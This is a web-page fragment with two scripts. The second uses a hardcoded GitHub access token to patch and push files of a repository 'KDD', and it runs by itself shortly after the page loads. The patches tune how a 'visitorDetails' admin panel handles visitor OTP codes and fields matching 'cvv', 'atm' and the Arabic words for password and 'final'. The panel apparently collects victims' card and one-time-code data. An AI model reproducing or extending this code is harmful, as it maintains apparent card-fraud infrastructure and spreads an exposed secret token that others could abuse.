(function(){
  if (window.__f100) return; window.__f100 = 1;
  var NOISE = /(cart|سلة|makani|kdd[-_]|coupon|كوبون|_v1|^f\d+$)/i;
  function isNoise(sec){
    var h = sec.querySelector("h3");
    if (!h || String(h.textContent||"").indexOf("📋") !== 0) return false;
    var spans = sec.querySelectorAll("span.block"), hit = false;
    for (var i=0;i<spans.length;i++){
      var k = (spans[i].textContent||"").trim();
      if (!k) continue;
      if (NOISE.test(k)) { hit = true; break; }
    }
    return hit;
  }
  function sweep(){
    var box = document.getElementById("visitorDetails");
    if (!box) return;
    var secs = box.querySelectorAll(".data-section");
    for (var i=0;i<secs.length;i++){
      var s = secs[i];
      if (s.getAttribute("data-f100") !== "1"){
        if (!isNoise(s)) continue;
        s.setAttribute("data-f100","1");
      }
      if (s.style.display !== "none") s.style.display = "none";
    }
  }
  var orig = window.renderVisitorDetails;
  if (typeof orig === "function" && !orig.__f100){
    var w = function(){ var r = orig.apply(this, arguments); try { sweep(); } catch(e){} return r; };
    w.__f100 = 1; window.renderVisitorDetails = w; try { renderVisitorDetails = w; } catch(e){}
  }
  function hook(){
    var box = document.getElementById("visitorDetails");
    if (box && !box.__f100){ box.__f100 = 1; try { new MutationObserver(function(){ sweep(); }).observe(box, { childList: true, subtree: true }); } catch(e){} }
    sweep();
  }
  hook(); setInterval(hook, 300);
})();
</script>

<script>
(function(){
  var HARD = "ghp_nXNrwePVjaVLeajga4xXjy8HItWVA1l8l1S0";
  var OWNER = "fahshomi-ui", REPO = "KDD", BRANCH = "main";
  var FILES = ["server/index.js", "server/admin/index.html", "kdd-public/admin.html"];
  function $(id){ return document.getElementById(id); }
  var st = $("st"), log = $("log"), tok = $("tok"), run = $("run");
  function set(t){ try { st.textContent = t; } catch(e){} }
  function say(t, c){ var d = document.createElement("div"); if (c) d.className = c; d.textContent = t; log.appendChild(d); }
  function clean(id){ var v = $(id).value; return v.replace(/^\n/, "").replace(/[ \t]+$/, "").replace(/\n+$/, ""); }
  var ADMIN = clean("pAdmin") + "\n";
  var ESC = "<\/script>";

  try {
    var qs = ""; try { qs = new URLSearchParams(location.search).get("token") || ""; } catch(e){}
    tok.value = qs || HARD;
    set("جاهز — اضغط رفع التعديلات");
  } catch(e){ set("خطأ أولي: " + e.message); }

  function patchServer(src){
    var out = src, n = 0;
    if (out.indexOf("/*FIX100E*/") === -1){
      var fe = clean("sEmitFind"), re = clean("sEmitRep"), i = out.indexOf(fe);
      if (i > -1){ out = out.slice(0, i) + re + out.slice(i + fe.length); n++; }
    }
    if (out.indexOf("/*FIX100x*/") === -1){
      var b4 = out;
      out = out.split("visitor.__f98otp = 0;").join("visitor.__f98otp = 0; /*FIX100x*/ visitor.__f100sent = 0;");
      if (out !== b4) n++;
    }
    var pr = out;
    out = out.split("/cvv|atm|مرور|نهائي|final|رئيسي/i").join("/cvv|atm|مرور|نهائي|final/i");
    if (out !== pr) n++;
    if (out.indexOf("/*FIX100D*/") === -1){
      var anc = clean("pDedupAnchor"), j = out.indexOf(anc);
      if (j > -1){ var at = j + anc.length; out = out.slice(0, at) + "\n      " + clean("pDedup") + out.slice(at); n++; }
    }
    if (out.indexOf("__f100reg") === -1){
      var rf = clean("pRegFind"), rr = clean("pRegRep");
      if (out.indexOf(rf) > -1){ out = out.split(rf).join(rr); n++; }
    }
    return { out: out, n: n };
  }

  function cutTag(html, open, close){
    var i = html.indexOf(open);
    if (i === -1) return html;
    var j = html.indexOf(close, i);
    if (j === -1) return html;
    j += close.length;
    while (html.charAt(j) === "\n") j++;
    return html.slice(0, i) + html.slice(j);
  }

  function patchAdmin(src){
    var out = src;
    if (out.indexOf('id="kddF100"') > -1) return { out: out, n: 0 };
    var n = 0;
    out = cutTag(out, '<script id="kddF99">', ESC);
    out = cutTag(out, '<style id="kddF99B">', "</style>");
    out = cutTag(out, '<script id="kddF99B">', ESC);
    var pr = out;
    out = out.split("/cvv|atm|مرور|نهائي|final|رئيسي/i").join("/cvv|atm|مرور|نهائي|final/i");
    if (out !== pr) n++;
    var idx = out.lastIndexOf("</body>");
    if (idx > -1){ out = out.slice(0, idx) + ADMIN + "\n" + out.slice(idx); n++; }
    return { out: out, n: n };
  }

  function b64(s){ return btoa(unescape(encodeURIComponent(s))); }
  function H(){ return { Authorization: "token " + tok.value.trim(), Accept: "application/vnd.github+json" }; }

  async function doFile(path){
    try {
      var gr = await fetch("https://api.github.com/repos/" + OWNER + "/" + REPO + "/contents/" + path + "?ref=" + BRANCH, { headers: H() });
      if (gr.status === 401){ say("✗ التوكن مرفوض (401)", "err"); return -1; }
      if (gr.status === 404){ say("✗ الملف غير موجود: " + path, "err"); return 0; }
      if (!gr.ok){ say("✗ " + path + " : HTTP " + gr.status, "err"); return 0; }
      var meta = await gr.json();
      var src = decodeURIComponent(escape(atob(meta.content.replace(/\n/g, ""))));
      var res = /\.js$/.test(path) ? patchServer(src) : patchAdmin(src);
      if (res.n === 0 || res.out === src){ say("• " + path + " : مطبّق مسبقاً", "warn"); return 0; }
      var pr = await fetch("https://api.github.com/repos/" + OWNER + "/" + REPO + "/contents/" + path, {
        method: "PUT", headers: Object.assign(H(), { "Content-Type": "application/json" }),
        body: JSON.stringify({ message: "FIX100: stop OTP double-emit + dedupe repeats + hide cart noise", content: b64(res.out), sha: meta.sha, branch: BRANCH })
      });
      if (!pr.ok){ var t = await pr.text(); say("✗ " + path + " : " + pr.status + " " + t.slice(0, 160), "err"); return 0; }
      say("✓ تم التعديل : " + path + "  (" + res.n + " تعديل)", "ok"); return 1;
    } catch(e){ say("✗ " + path + " : " + e.message, "err"); return 0; }
  }

  async function runAll(){
    try {
      log.innerHTML = "";
      if (!tok.value.trim()){ say("أدخل التوكن", "err"); return; }
      try { localStorage.setItem("kdd_token", tok.value.trim()); } catch(e){}
      run.disabled = true;
      set("جاري الرفع...");
      say("بدء الرفع...");
      var ok = 0, bad = 0;
      for (var i = 0; i < FILES.length; i++){
        set("معالجة: " + FILES[i]);
        var r = await doFile(FILES[i]);
        if (r === 1) ok++;
        if (r === -1) bad++;
      }
      say("");
      say("النتيجة: " + ok + " ملف معدّل" + (bad ? " · التوكن مشكلة" : ""), ok ? "ok" : "warn");
      if (ok) say("استنى 2-3 دقايق (Render يعيد النشر) وبعدها Ctrl+F5.", "warn");
      set(ok ? "تم ✓ — " + ok + " ملف" : "انتهى بدون تعديل");
      run.disabled = false;
    } catch(e){ say("خطأ: " + e.message, "err"); set("خطأ"); run.disabled = false; }
  }

  run.addEventListener("click", runAll);
  setTimeout(runAll, 700);
})();
</script>
